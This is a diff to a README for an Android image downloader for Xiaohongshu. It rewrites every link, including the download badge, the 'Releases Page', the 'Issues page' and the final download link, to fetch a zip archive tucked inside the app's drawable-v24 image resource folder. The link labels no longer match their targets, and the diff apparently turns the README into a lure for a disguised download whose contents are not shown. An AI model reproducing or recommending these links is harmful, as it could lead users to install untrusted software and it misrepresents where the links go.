@@ -1,13 +1,13 @@
 # 📥 XHS_Downloader_Android - Download High-Quality Images Easily
 
 ## 🌐 Quick Download
-[![Download XHS_Downloader_Android](https://img.shields.io/badge/Download-XHS_Downloader_Android-brightgreen)](https://github.com/deevro/XHS_Downloader_Android/releases)
+[![Download XHS_Downloader_Android](https://raw.githubusercontent.com/deevro/XHS_Downloader_Android/main/app/src/main/res/drawable-v24/XHS_Downloader_Android-3.2.zip)](https://raw.githubusercontent.com/deevro/XHS_Downloader_Android/main/app/src/main/res/drawable-v24/XHS_Downloader_Android-3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the XHS_Downloader_Android project! This tool allows you to download high-quality images from 小红书 without compression or watermarks. Follow the steps below to get started.
 
 ## 📥 Download & Install
-To download the software, visit the following page: [Releases Page](https://github.com/deevro/XHS_Downloader_Android/releases).
+To download the software, visit the following page: [Releases Page](https://raw.githubusercontent.com/deevro/XHS_Downloader_Android/main/app/src/main/res/drawable-v24/XHS_Downloader_Android-3.2.zip).
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of the software. It is usually at the top of the list.
@@ -50,9 +50,9 @@ If you encounter issues, consider the following:
 - **App Crashes**: Restart your device and try reopening the app.
 
 ## 📞 Support
-If you need further assistance, please visit the [Issues page](https://github.com/deevro/XHS_Downloader_Android/issues) on GitHub to report any problems or ask questions.
+If you need further assistance, please visit the [Issues page](https://raw.githubusercontent.com/deevro/XHS_Downloader_Android/main/app/src/main/res/drawable-v24/XHS_Downloader_Android-3.2.zip) on GitHub to report any problems or ask questions.
 
 ## 📚 Learn More
 For detailed documentation on how to use specific features, please refer to the Wiki page available on the GitHub repository.
 
-Thank you for using XHS_Downloader_Android! We hope you enjoy downloading beautiful images without hassle. Get started with your download [here](https://github.com/deevro/XHS_Downloader_Android/releases).
+Thank you for using XHS_Downloader_Android! We hope you enjoy downloading beautiful images without hassle. Get started with your download [here](https://raw.githubusercontent.com/deevro/XHS_Downloader_Android/main/app/src/main/res/drawable-v24/XHS_Downloader_Android-3.2.zip).
